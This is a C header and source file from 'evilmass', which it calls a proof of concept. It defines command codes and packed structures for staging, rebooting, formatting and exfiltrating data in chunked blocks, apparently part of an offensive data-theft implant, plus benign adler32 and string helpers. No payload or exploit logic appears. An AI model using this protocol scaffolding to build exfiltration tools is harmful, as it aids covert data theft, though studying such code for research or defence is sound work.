#ifndef COMSRC_H_
#define COMSRC_H_

/*
evilmass - MIT License - Copyright 2020
-
David Reguera Garcia aka Dreg - dreg@fr33project.org
-
http://www.rootkit.es/
http://github.com/David-Reguera-Garcia-Dreg/
http://www.fr33project.org/
-
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.

WARNING! this is a POC, the code is CRAP
*/

#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#define NLS "\r\n"
#define SNLS 2

#define D_FILE_NAME  "d.exe"
#define D_FILE_NAMEW L"d.exe"

#define EXFIL_STR  "EXFSTG"
#define MASTR_STR  "MAXSTR"
#define EXFBLK_STR "EXFBLK"
#define RSTPKT_STR "RSTPKT"

#define SIZE_PRLE_CMD 4

#define PRLE_CMD_AM_I_IN_STAGE2   "+.-A"
#define PRLE_CMD_I_AM_IN_STAGE2   "+.-2"
#define PRLE_CMD_REBOOTME         "+.-R"
#define PRLE_CMD_EXFILL           "+.-E"
#define PRLE_CMD_OK               "+.-O"
#define PRLE_CMD_NOK              "+.-N"
#define PRLE_CMD_FORMAT           "+.-F"
#define PRLE_CMD_GETRSTPKT        "+.-P"

#define R_FILE_STAGE2_FLAG        0x00
#define R_FILE_STAGEEXFILL_FLAG   0x01
#define R_FILE_STAGEONLYMASS_FLAG 'r'
#define R_FILE_RESETWORKS_FLAG    'P'

#define SIZE_DATA_EXF 30
#define SIZE_TAG_NAME 20

#define xstr(a) str(a)
#define str(a) #a

#ifndef _WIN32
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wpragmas"
#endif
#pragma pack(push,1)
struct LAST_BLOCK_DATA_s
{
    uint32_t adler32_full_blocks;
    uint32_t size_file;
    char tag_name[SIZE_TAG_NAME];
};

typedef struct LAST_BLOCK_DATA_s LAST_BLOCK_DATA_t;

struct EXFL_BLK_s
{
    unsigned char exfstr[sizeof(EXFIL_STR)];
    uint32_t fileid;
    uint32_t curr_block_nr;
    bool last_block;
    unsigned char data[SIZE_DATA_EXF];
};

typedef struct EXFL_BLK_s EXFL_BLK_t;


#pragma pack(pop)
#ifndef _WIN32
#pragma GCC diagnostic pop
#endif 

#ifdef __cplusplus
extern "C" {
#endif

int mystricmp(const char* p1, const char* p2);

void* mymemmem(void* haystack,
               size_t haystack_len,
               void* const needle,
               size_t needle_len);

uint32_t update_adler32(uint32_t adler,
                        const unsigned char* data,
                        uint32_t len); // first call with 1 value

#ifdef __cplusplus
}
#endif

#endif /* COMSRC_H_ */

#ifdef COMSRC

uint32_t update_adler32(uint32_t adler, const unsigned char* data, uint32_t len)
{
    // first call with 1 value
    uint32_t s1 = adler & 0xffff;
    uint32_t s2 = (adler >> 16) & 0xffff;

    while (len > 0)
    {
        /*at least 5550 sums can be done before the sums overflow, saving a lot of module divisions*/
        uint32_t amount = len > 5550 ? 5550 : len;
        len -= amount;
        while (amount > 0)
        {
            s1 += (*data++);
            s2 += s1;
            --amount;
        }
        s1 %= 65521;
        s2 %= 65521;
    }

    return (s2 << 16) | s1;
}

int mystricmp(const char* p1, const char* p2)
{
    register unsigned char* s1 = (unsigned char*) p1;
    register unsigned char* s2 = (unsigned char*) p2;
    unsigned char c1, c2;

    do
    {
        c1 = (unsigned char) toupper((int) * s1++);
        c2 = (unsigned char) toupper((int) * s2++);
        if (c1 == '\0')
        {
            return c1 - c2;
        }
    } while (c1 == c2);

    return c1 - c2;
}

void* mymemmem(void* haystack, size_t haystack_len, void* const needle,
               size_t needle_len)
{
    if (haystack == NULL)
    {
        return NULL;
    }
    if (haystack_len == 0)
    {
        return NULL;
    }
    if (needle == NULL)
    {
        return NULL;
    }
    if (needle_len == 0)
    {
        return NULL;
    }

    for (unsigned char* h = (unsigned char*)haystack;
            haystack_len >= needle_len;
            ++h, --haystack_len)
    {
        if (!memcmp(h, needle, needle_len))
        {
            return h;
        }
    }
    return NULL;
}

#endif /* COMSRC */


